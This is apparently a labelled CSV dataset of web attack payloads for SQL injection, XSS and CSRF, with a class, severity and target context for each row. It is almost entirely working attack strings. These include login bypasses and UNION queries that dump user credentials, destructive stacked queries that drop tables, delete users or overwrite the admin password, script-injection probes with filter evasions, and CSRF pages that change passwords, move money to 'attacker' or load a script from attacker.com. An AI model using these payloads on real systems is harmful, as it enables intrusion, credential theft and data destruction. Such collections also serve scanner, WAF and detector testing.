id,attack_class,type,severity,context,payload_hash,payload
sqli-001,SQLi,tautology,high,Login form username input,154eec809fb3,' OR '1'='1
sqli-002,SQLi,union,high,Search input field,5a223cf8ec59,"' UNION SELECT username, password FROM users--"
sqli-003,SQLi,blind-time,medium,ID parameter in URL,95a38465d448,'; WAITFOR DELAY '0:0:5'--
sqli-004,SQLi,error-based,medium,User ID input,6b7595444181,"' AND 1=CONVERT(int,@@version)--"
sqli-005,SQLi,boolean-blind,medium,Search field,9f6c1aa0cd11,' AND 1=1--
sqli-006,SQLi,stacked-queries,critical,User input in form,86c75ed9b0e1,'; DROP TABLE users--
sqli-007,SQLi,tautology,high,Login password field,4b44bb36a1db,' OR 1=1--
sqli-008,SQLi,tautology,medium,URL parameter,095137e7d121,0x27 OR 0x31=0x31--
sqli-009,SQLi,blind-time,medium,PostgreSQL ID parameter,e9d7ea913642,'; SELECT pg_sleep(5)--
sqli-010,SQLi,error-based,medium,User input,89e8e6cff870,"' AND 1=CONVERT(int,USER())--"
sqli-011,SQLi,boolean-blind,medium,Search input,0d6123b277df,"' AND SUBSTRING(@@version,1,1)='5'--"
sqli-012,SQLi,tautology,high,Login username,e1702bf91751,' OR 'a'='a
sqli-013,SQLi,tautology,high,Search field,0a7541cb14aa,' OR 1=1-- -
sqli-014,SQLi,tautology,high,Login form,14c89135444f,'//OR//1=1--
sqli-015,SQLi,tautology,medium,User input,af918e8d6fca,' OR CAST('a' AS INT)=CAST('a' AS INT)--
sqli-016,SQLi,blind-time,medium,ID parameter,5bf1895c6a9d,' OR SLEEP(5)--
sqli-017,SQLi,error-based,high,User input,969d35478dcb,"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
sqli-018,SQLi,error-based,high,User input,0f98235c482e,"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
sqli-019,SQLi,blind-time,medium,ID parameter,64ed90a385fc,'; SELECT pg_sleep(10)--
sqli-020,SQLi,tautology,high,Login form,58286860220d,' OR 1=1#
sqli-021,SQLi,blind-time,medium,Search input,9ba0c16f053a,' OR SLEEP(10)--
sqli-022,SQLi,union,high,Search field,59739c99173f,"' UNION SELECT NULL, NULL, username, password FROM users--"
sqli-023,SQLi,tautology,high,Login username,99419739cd09,' OR 1=1/*
sqli-024,SQLi,boolean-blind,medium,Search input,91133148b21e,' AND (SELECT COUNT(*) FROM users) > 0--
sqli-025,SQLi,blind-time,medium,ID parameter,338195803dcd,' OR pg_sleep(7)--
sqli-026,SQLi,union,high,Search input,e3f8372ba766,"' UNION SELECT database(), NULL--"
sqli-027,SQLi,blind-time,medium,User ID input,7db5a21350c5,'; WAITFOR DELAY '0:0:10'--
sqli-028,SQLi,tautology,medium,Login form,e9b6195b56b6,' OR CAST(1 AS INT)=1--
sqli-029,SQLi,boolean-blind,medium,Search input,2183b013018a,"' OR SUBSTRING(user(),1,1)='r'--"
sqli-030,SQLi,blind-time,medium,User input,a1b644436a33,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--
sqli-031,SQLi,union,high,Search input,7621fe52e869,"' UNION SELECT table_name, NULL FROM information_schema.tables--"
sqli-032,SQLi,blind-time,medium,ID parameter,4c3bf91b7149,' OR (SELECT sleep(5))--
sqli-033,SQLi,tautology,medium,Login username,7359e77635a6,' OR 0x61646d696e=0x61646d696e--
sqli-034,SQLi,blind-time,medium,Search input,75e1e513c95f,' OR SLEEP(5)#
sqli-035,SQLi,union,high,Search input,5e44e42c0301,"' UNION SELECT user(), NULL--"
sqli-036,SQLi,blind-time,medium,ID parameter,6a73908491a5,' OR pg_sleep(3)--
sqli-037,SQLi,blind-time,medium,User ID input,3772a6acdd09,'; WAITFOR DELAY '0:0:3'--
sqli-038,SQLi,boolean-blind,medium,Search input,c299b265a9fa,"' OR SUBSTRING(@@version,1,1)='5'--"
sqli-039,SQLi,blind-time,medium,User input,e69a747f6252,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--
sqli-040,SQLi,stacked-queries,critical,User input,bcbe9ad53e71,"'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--"
sqli-041,SQLi,blind-time,medium,Search input,f45cc1448d90,' OR SLEEP(8)/*
sqli-043,SQLi,boolean-blind,medium,Login input,e3a21306714e,"' OR SUBSTRING(user(),1,1)='a'/*"
sqli-044,SQLi,stacked-queries,critical,User input,b9b203237ee9,'; UPDATE users SET password='hacked' WHERE username='admin'--
sqli-045,SQLi,blind-time,medium,ID parameter,826442a651a3,' OR pg_sleep(6)/*
sqli-046,SQLi,union,high,Search input,43562808d09a,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
sqli-047,SQLi,tautology,medium,Login form,c080665a20bf,' OR CAST('1' AS INT)=1--
sqli-048,SQLi,blind-time,medium,User ID input,22b60dd99e75,'; WAITFOR DELAY '0:0:7'/*
sqli-049,SQLi,boolean-blind,medium,Search input,17245738ef77,"' OR SUBSTRING(@@version,1,1)='8'#"
sqli-051,SQLi,blind-time,medium,User input,add6b696e76e,' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/
sqli-052,SQLi,stacked-queries,critical,User input,31e08d6ad10c,'; DELETE FROM users WHERE username='guest'--
sqli-053,SQLi,tautology,medium,Login username,077be1698990,' OR 0x31=0x31--
sqli-054,SQLi,blind-time,medium,Search input,171c386f2f0b,' OR SLEEP(9)#
sqli-055,SQLi,union,high,Search input,a9a4dd98eaa6,"' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
sqli-056,SQLi,blind-time,medium,ID parameter,d4dd7331be31,' OR pg_sleep(4)#
sqli-057,SQLi,tautology,medium,Login form,9cd2eaa7a1f3,' OR CAST(1 AS INT)=1/*
sqli-058,SQLi,boolean-blind,medium,Search input,c4c6dada2c1e,"' OR SUBSTRING(user(),1,1)='b'/*"
sqli-060,SQLi,stacked-queries,critical,User input,01cf98e93780,"'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--"
sqli-061,SQLi,blind-time,medium,User ID input,60e88e716850,'; WAITFOR DELAY '0:0:5'#
sqli-062,SQLi,boolean-blind,medium,Search input,a89a2871a8c4,"' OR SUBSTRING(@@version,1,1)='9'#"
sqli-064,SQLi,blind-time,medium,User input,01c147038c7f,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#
sqli-065,SQLi,stacked-queries,critical,User input,ea837cbd618e,'; DROP TABLE sessions--
sqli-066,SQLi,tautology,medium,Login username,d77c3dc9ae99,' OR 0x41=0x41--
sqli-067,SQLi,blind-time,medium,Search input,e64b3021284c,' OR SLEEP(11)--
sqli-069,SQLi,blind-time,medium,ID parameter,9a1bd9f382b0,' OR pg_sleep(12)--
sqli-070,SQLi,stacked-queries,critical,User input,efc270cbc596,'; UPDATE users SET password='newpass' WHERE username='admin'--
sqli-071,SQLi,blind-time,medium,Search input,01c0a614fa49,' OR SLEEP(12)--
sqli-072,SQLi,union,high,Search input,3538343fb033,"' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--"
sqli-073,SQLi,boolean-blind,medium,Login input,fceb7421ac10,"' OR SUBSTRING(user(),1,1)='c'--"
sqli-074,SQLi,stacked-queries,critical,User input,d2dadb2bceb9,"'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--"
sqli-075,SQLi,blind-time,medium,ID parameter,0da72eba179d,' OR pg_sleep(8)--
sqli-076,SQLi,union,high,Search input,a46b83122f1c,"' UNION SELECT @@version, NULL--"
sqli-078,SQLi,blind-time,medium,User ID input,6c17d48159f4,'; WAITFOR DELAY '0:0:8'--
sqli-079,SQLi,boolean-blind,medium,Search input,e53eebf930d1,"' OR SUBSTRING(@@version,1,1)='7'--"
sqli-081,SQLi,blind-time,medium,User input,53ac2eb71e68,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--
sqli-082,SQLi,stacked-queries,critical,User input,793cc4fd6418,'; DELETE FROM users WHERE username='admin'--
sqli-083,SQLi,tautology,medium,Login username,357f103f32eb,' OR 0x42=0x42--
sqli-084,SQLi,blind-time,medium,Search input,7db046800de0,' OR SLEEP(13)--
sqli-086,SQLi,blind-time,medium,ID parameter,947d6a7bf9f7,' OR pg_sleep(14)--
sqli-088,SQLi,boolean-blind,medium,Search input,c8ea7a7d88f8,"' OR SUBSTRING(user(),1,1)='d'--"
sqli-090,SQLi,stacked-queries,critical,User input,dc0d0e7ca49a,"'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--"
sqli-091,SQLi,blind-time,medium,User ID input,d2cbeca39279,'; WAITFOR DELAY '0:0:9'--
sqli-092,SQLi,boolean-blind,medium,Search input,57b9cd711d86,"' OR SUBSTRING(@@version,1,1)='6'--"
sqli-094,SQLi,blind-time,medium,User input,470fefa04c05,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--
sqli-096,SQLi,tautology,medium,Login username,e74a0969511a,' OR 0x43=0x43--
sqli-097,SQLi,blind-time,medium,Search input,b1faf0fe529d,' OR SLEEP(14)--
sqli-099,SQLi,blind-time,medium,ID parameter,efea1371e429,' OR pg_sleep(15)--
sqli-100,SQLi,stacked-queries,critical,User input,a9f38e932075,'; UPDATE users SET password='securepass' WHERE username='admin'--
xss-001,XSS,reflected,high,URL parameter,1b4978d617f5,<script>alert('XSS1')</script>
xss-002,XSS,reflected,high,URL parameter,78abecf0a736,<img src=x onerror=alert('XSS2')>
xss-003,XSS,stored,high,Comment input,ba65bff15667,<script>alert('XSS3')</script>
xss-004,XSS,reflected,high,URL parameter,ed8e7ea05207,"<a href='javascript:alert(""XSS4"")'>click</a>"
xss-005,XSS,reflected,high,URL parameter,99c3fbbe07bb,<input autofocus onfocus=alert('XSS5')>
xss-006,XSS,stored,high,User profile bio,bab8e85a5967,"<iframe src='javascript:alert(""XSS6"")'></iframe>"
xss-007,XSS,reflected,high,URL parameter,5755f13cd141,<svg onload=alert('XSS7')>
xss-008,XSS,reflected,high,URL parameter,82b698be77b5,<body onload=alert('XSS8')>
xss-009,XSS,stored,high,User input field,1b7c1bea0720,<div onclick=alert('XSS9')>Click me</div>
xss-010,XSS,reflected,high,URL parameter,5192d21f6c4e,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS10"")'>"
xss-011,XSS,reflected,high,URL parameter,05c97df6ba07,"<style>body{background:url(""javascript:alert('XSS11')"")}</style>"
xss-012,XSS,reflected,high,URL parameter,459dc0a8cb89,%3Cscript%3Ealert('XSS12')%3C/script%3E
xss-013,XSS,stored,high,User input field,b66661b86b28,<span onmouseover=alert('XSS13')>Hover me</span>
xss-014,XSS,reflected,high,URL parameter,da2c70c5e510,"<iframe srcdoc=""<script>alert('XSS14')</script>""></iframe>"
xss-015,XSS,reflected,high,URL parameter,0f2965fb50a4,"<object data='javascript:alert(""XSS15"")'></object>"
xss-016,XSS,stored,high,User input field,113855d37fc4,<form onsubmit=alert('XSS16')><input type='submit'></form>
xss-017,XSS,reflected,high,URL parameter,7e04cfc6f1e7,<video src=x onerror=alert('XSS17')></video>
xss-018,XSS,reflected,high,URL parameter,57d409b21444,<audio src=x onerror=alert('XSS18')></audio>
xss-019,XSS,stored,high,User input field,ca38aa288fce,<textarea onfocus=alert('XSS19')>Focus me</textarea>
xss-020,XSS,reflected,high,URL parameter,0b92187665b3,"<math href='javascript:alert(""XSS20"")'>X</math>"
xss-021,XSS,reflected,high,URL parameter,0ff481084eaa,"<base href=""javascript:alert('XSS21');//"">"
xss-022,XSS,stored,high,User input field,d0472896e256,"<a href='#' onclick='alert(""XSS22"")'>Click me</a>"
xss-023,XSS,reflected,high,URL parameter,f26fb92aa405,"<meta http-equiv='refresh' content='0;url=javascript:alert(""XSS23"")'>"
xss-024,XSS,stored,high,User input field,872e4ff7b577,"<button onclick='alert(""XSS24"")'>Click</button>"
xss-025,XSS,reflected,high,URL parameter,4911dd824d42,<form onreset=alert('XSS25')><input type='reset'></form>
xss-026,XSS,stored,high,User input field,11a90254bb71,<marquee onstart=alert('XSS26')>Scrolling text</marquee>
xss-027,XSS,reflected,high,URL parameter,ce92ef0e5810,"<embed src='javascript:alert(""XSS27"")'>"
xss-028,XSS,stored,high,User input field,8246932eb788,"<bgsound src='javascript:alert(""XSS28"")'>"
xss-029,XSS,reflected,high,URL parameter,24a1cc7010e7,<xml onload=alert('XSS29')>
xss-030,XSS,stored,high,User input field,72ffaf1ded30,"<iframe src='about:blank' onload='alert(""XSS30"")'></iframe>"
xss-031,XSS,reflected,high,URL parameter,8b3e48691abb,<svg><animate attributeName='onbegin' begin='0s' dur='1s' repeatCount='1' fill='freeze' to='alert(1)'/></svg>
xss-032,XSS,stored,high,User profile input,4bac8a03df5d,"<base href=""javascript:alert('XSS32');//"">"
xss-033,XSS,reflected,high,URL parameter,58d9dd39b3ea,<iframe srcdoc='%3Cscript%3Ealert(33)%3C/script%3E'></iframe>
xss-034,XSS,stored,high,User input field,1a26e9dbb8b8,"<div onpointerover='alert(""XSS34"")'>Hover me</div>"
xss-035,XSS,reflected,high,URL parameter,29a4ba1ebf02,<script>alert(XSS35)</script>
xss-036,XSS,stored,high,User input field,52375d4e2983,<svg><foreignObject><body><script>alert('XSS36')</script></body></foreignObject></svg>
xss-037,XSS,reflected,high,URL parameter,fdc751b68e3f,"<div style='animation-name:x' onanimationstart='alert(""XSS37"")'>Test</div>"
xss-038,XSS,stored,high,User input field,891c532302a9,"<input oninput='alert(""XSS38"")'>"
xss-039,XSS,reflected,high,URL parameter,ab94684d417a,<script>eval(alert('XSS39'))</script>
xss-040,XSS,stored,high,User input field,1fe856872d68,"<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNDAnKTs8L3NjcmlwdD4='></object>"
xss-041,XSS,reflected,high,URL parameter,ce5e1e1f70c0,"<span onpointerdown='alert(""XSS41"")'>Click me</span>"
xss-042,XSS,stored,high,User input field,4e5add648409,"<math href='javascript:alert(""XSS42"")'>X</math>"
xss-043,XSS,reflected,high,URL parameter,cfbb2dc10b73,"<iframe sandbox='allow-scripts' srcdoc='<script>alert(""XSS43"")</script>'></iframe>"
xss-044,XSS,stored,high,User input field,e76bd9163fa8,"<video oncanplay='alert(""XSS44"")'></video>"
xss-045,XSS,reflected,high,URL parameter,851c4af192f7,"<meta http-equiv='refresh' content='0;url=javascript&#58;alert(""XSS45"")'>"
xss-046,XSS,stored,high,User input field,362f11fc3402,"<svg><set attributeName='onbegin' to='alert(""XSS46"")' begin='0s' dur='1s'/></svg>"
xss-047,XSS,reflected,high,URL parameter,33e160eeb11b,"<script>setTimeout('alert(""XSS47"")',0)</script>"
xss-048,XSS,stored,high,User input field,2557bf980db5,"<details ontoggle='alert(""XSS48"")'><summary>Click me</summary></details>"
xss-049,XSS,reflected,high,URL parameter,40b8877b4516,"<input formaction='javascript:alert(""XSS49"")' type='submit'>"
xss-050,XSS,stored,high,User input field,c7f79b7757fc,"<svg><animateMotion onbegin='alert(""XSS50"")' dur='1s' repeatCount='1'/></svg>"
xss-051,XSS,reflected,high,URL parameter,bc26074b80cd,"<script>setInterval(function(){alert('XSS51')},1000)</script>"
xss-052,XSS,stored,high,User input field,36a82ab6c0e3,"<iframe srcdoc='<script>alert(""XSS52"")</script>' onload='alert(""XSS52"")'></iframe>"
xss-053,XSS,reflected,high,URL parameter,15db1dd5e91a,"<svg onload='alert(""XSS53"")'><script>alert('XSS53')</script></svg>"
xss-054,XSS,stored,high,User input field,bf6ef12cba93,"<iframe src='javascript:alert(""XSS54"")'></iframe>"
xss-055,XSS,reflected,high,URL parameter,8b7147d4fc93,"<object type='text/html' data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTNTUnKTs8L3NjcmlwdD4='></object>"
xss-056,XSS,stored,high,User input field,9ba7008877de,"<svg onload='setTimeout(function(){alert(""XSS56"")},0)'></svg>"
xss-057,XSS,reflected,high,URL parameter,08c7a03b5458,"<iframe srcdoc=""&lt;script&gt;alert('XSS57')&lt;/script&gt;""></iframe>"
xss-058,XSS,stored,high,User input field,7508c7281399,"<svg><animateTransform attributeName='onbegin' to='alert(""XSS58"")' begin='0s' dur='1s'/></svg>"
xss-059,XSS,reflected,high,URL parameter,e863e8d5a936,"<script>Function('alert(""XSS59"")')()</script>"
xss-060,XSS,stored,high,User input field,cce69b1e3fed,"<iframe onload='alert(""XSS60"")' srcdoc='%3Cscript%3Ealert(%22XSS60%22)%3C/script%3E'></iframe>"
xss-061,XSS,reflected,high,URL parameter,83fafb627b95,<svg><filter><feImage xlink:href='javascript:alert(61)' onload='alert(61)'/></filter></svg>
xss-062,XSS,stored,high,User input field,04132a0b3261,"<details ontoggle='alert(""XSS62"")'><summary>Click me</summary></details>"
xss-063,XSS,reflected,high,URL parameter,7c2adfc93969,"<math href='javascript:alert(""XSS63"")'>X</math>"
xss-064,XSS,stored,high,User input field,fd0ef3eeaea8,"<audio src='x' onerror='alert(""XSS64"")'></audio>"
xss-065,XSS,reflected,high,URL parameter,492945f5bd0d,"<iframe srcdoc='<script>alert(""XSS65"")</script>' onload='alert(""XSS65"")'></iframe>"
xss-066,XSS,stored,high,User input field,021e3be86014,"<svg><animateMotion onbegin='alert(""XSS66"")' dur='1s' repeatCount='1'/></svg>"
xss-067,XSS,reflected,high,URL parameter,4a365c109941,"<input oninvalid='alert(""XSS67"")' required>"
xss-068,XSS,stored,high,User input field,386f1db5b067,"<iframe allow='scripts' srcdoc='<script>alert(""XSS68"")</script>'></iframe>"
xss-069,XSS,reflected,high,URL parameter,476523cd89ca,"<svg tabindex='1' onfocusin='alert(""XSS69"")'></svg>"
xss-070,XSS,stored,high,User input field,6d8f20967cf6,"<video onpause='alert(""XSS70"")'></video>"
xss-071,XSS,reflected,high,URL parameter,b8d1f64c2ae1,"<svg onmouseenter='alert(""XSS71"")'></svg>"
xss-072,XSS,stored,high,User input field,c030ca856118,"<form oninput='alert(""XSS72"")'><input></form>"
xss-073,XSS,reflected,high,URL parameter,2ab53cb12a29,"<svg onwheel='alert(""XSS73"")'></svg>"
xss-074,XSS,stored,high,User input field,ba50a8f0cd71,"<iframe allowfullscreen onload='alert(""XSS74"")'></iframe>"
xss-075,XSS,reflected,high,URL parameter,5a97ec0e3903,"<svg onanimationend='alert(""XSS75"")'></svg>"
xss-076,XSS,stored,high,User input field,e935976b7a7d,"<audio onplay='alert(""XSS76"")'></audio>"
xss-077,XSS,reflected,high,URL parameter,c8fd27852076,"<svg onscroll='alert(""XSS77"")' style='overflow:auto;height:10px;'></svg>"
xss-078,XSS,stored,high,User input field,d9a11d8c188b,"<iframe seamless onload='alert(""XSS78"")'></iframe>"
xss-079,XSS,reflected,high,URL parameter,06e040ad1415,"<svg oncut='alert(""XSS79"")'></svg>"
xss-080,XSS,stored,high,User input field,ca200f8ca384,"<svg oncopy='alert(""XSS80"")'></svg>"
xss-081,XSS,reflected,high,URL parameter,fd22eaff922e,"<svg onpaste='alert(""XSS81"")'></svg>"
xss-082,XSS,stored,high,User input field,2ec5c9a653b0,"<svg onreset='alert(""XSS82"")'></svg>"
xss-083,XSS,reflected,high,URL parameter,097f94a8796e,"<svg onsearch='alert(""XSS83"")'></svg>"
xss-084,XSS,stored,high,User input field,0d798c7acfba,"<svg onselect='alert(""XSS84"")'></svg>"
xss-085,XSS,reflected,high,URL parameter,cb535c3669f4,"<svg onshow='alert(""XSS85"")'></svg>"
xss-086,XSS,stored,high,User input field,83abcb8a6517,"<svg ontoggle='alert(""XSS86"")'></svg>"
xss-087,XSS,reflected,high,URL parameter,310d2ee7406e,"<svg ontransitionend='alert(""XSS87"")'></svg>"
xss-088,XSS,stored,high,User input field,0568c4e90d56,"<svg onunload='alert(""XSS88"")'></svg>"
xss-089,XSS,reflected,high,URL parameter,1924fa4dc3a1,"<svg onvolumechange='alert(""XSS89"")'></svg>"
xss-090,XSS,stored,high,User input field,318c67389ace,"<svg onwaiting='alert(""XSS90"")'></svg>"
xss-091,XSS,reflected,high,URL parameter,457c1d546aef,"<svg onwheel='alert(""XSS91"")' style='animation:spin 1s linear infinite'></svg>"
xss-092,XSS,stored,high,User input field,d6b195fb00bc,"<svg onpointercancel='alert(""XSS92"")'></svg>"
xss-093,XSS,reflected,high,URL parameter,1d0cd75bac24,"<svg onpointerout='alert(""XSS93"")'></svg>"
xss-094,XSS,stored,high,User input field,fc01335c0868,"<svg onpointerover='alert(""XSS94"")'></svg>"
xss-095,XSS,reflected,high,URL parameter,0ff67572e0dd,"<svg onpointerup='alert(""XSS95"")'></svg>"
xss-096,XSS,stored,high,User input field,700786cfd413,"<svg onselectstart='alert(""XSS96"")'></svg>"
xss-097,XSS,reflected,high,URL parameter,46d5ea12d0ef,"<svg tabindex='0' onshow='alert(""XSS97"")'></svg>"
xss-098,XSS,stored,high,User input field,51571d70e08b,"<svg onstalled='alert(""XSS98"")'></svg>"
xss-099,XSS,reflected,high,URL parameter,a65e01594cf2,"<svg onsubmit='alert(""XSS99"")'></svg>"
xss-100,XSS,stored,high,User input field,2336638f6e3c,"<svg onunload='alert(""XSS100"")'><script>alert('XSS100')</script></svg>"
csrf-001,CSRF,CSRF,high,Malicious webpage,ff2cc194f7cb,<form action='https://target.com/change-password' method='POST' id='csrfForm'><input type='hidden' name='password' value='hacked123'/></form><script>document.getElementById('csrfForm').submit();</script>
csrf-002,CSRF,CSRF,medium,Malicious webpage,6c687d4f4d8e,<img src='https://target.com/delete-account?confirm=yes' style='display:none'/>
csrf-003,CSRF,CSRF,high,Malicious webpage,7e3061f36552,"<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://target.com/transfer',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('amount=1000&to=attacker');</script>"
csrf-004,CSRF,CSRF,high,Malicious webpage,7587f0801424,"<script>fetch('https://target.com/update-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'email=attacker@example.com'});</script>"
csrf-005,CSRF,CSRF,medium,Malicious webpage,a91e76494ba6,<form action='https://target.com/upload-avatar' method='POST' enctype='multipart/form-data' id='csrfForm'><input type='file' name='avatar' value='malicious.jpg'/></form><script>document.getElementById('csrfForm').submit();</script>
csrf-006,CSRF,CSRF,medium,Malicious webpage,1ee00cf67dcb,<meta http-equiv='refresh' content='0;url=https://target.com/subscribe?plan=premium'/>
csrf-007,CSRF,CSRF,high,Malicious webpage,1fc35eb3392f,<script src='https://attacker.com/csrf-trigger.js'></script>
